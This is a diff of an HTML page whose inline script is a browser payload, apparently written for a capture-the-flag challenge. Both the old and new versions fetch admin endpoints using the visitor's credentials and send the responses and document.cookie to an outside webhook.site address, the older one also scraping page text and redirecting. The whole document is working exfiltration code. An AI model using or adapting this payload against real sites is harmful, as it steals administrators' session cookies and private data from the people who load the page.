@@ -3,36 +3,39 @@
 <body>
     <script>
         const webh = "https://webhook.site/eea9d67e-7379-46ca-b85a-c69dad2bf391";
+        const myMsgId = "69ea8fcabee6d6b7c66463f6"; 
         
-        async function leakData() {
-            // List of high-value API endpoints
-            const apis = [
-                "/api/admin/messages",
-                "/api/auth/session",
-                "/api/admin/config"
+        async function stealFlag() {
+            // Path 1: The API endpoint for that specific message
+            // Path 2: The UI page for that specific message
+            const targets = [
+                `/api/admin/messages/${myMsgId}`,
+                `/admin/contacts/${myMsgId}`
             ];
 
-            for (let url of apis) {
+            for (let url of targets) {
                 try {
-                    const r = await fetch(url);
-                    const data = await r.text();
-                    // If we get a valid response, beam it back
-                    if (r.ok) {
-                        new Image().src = `${webh}/api_leak?path=${btoa(url)}&res=${btoa(data.substring(0, 2000))}`;
-                    }
-                } catch(e) {}
+                    const r = await fetch(url, { credentials: 'include' });
+                    const content = await r.text();
+                    
+                    // Exfiltrate the data
+                    // We use btoa to keep the data clean during transmission
+                    fetch(webh, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({
+                            path: url,
+                            data: btoa(unescape(encodeURIComponent(content)))
+                        })
+                    });
+                } catch (e) {}
             }
-
-            // Ultimate Fallback: Scrape the entire DOM and Cookies
-            const context = {
-                url: window.location.href,
-                cookies: document.cookie,
-                body: document.body.innerText.substring(0, 1000)
-            };
-            location.href = `${webh}/final?ctx=${btoa(JSON.stringify(context))}`;
+            
+            // Final "catch-all" to see if we can get cookies too
+            new Image().src = `${webh}/cookies?val=${btoa(document.cookie)}`;
         }
 
-        leakData();
+        stealFlag();
     </script>
 </body>
 </html>
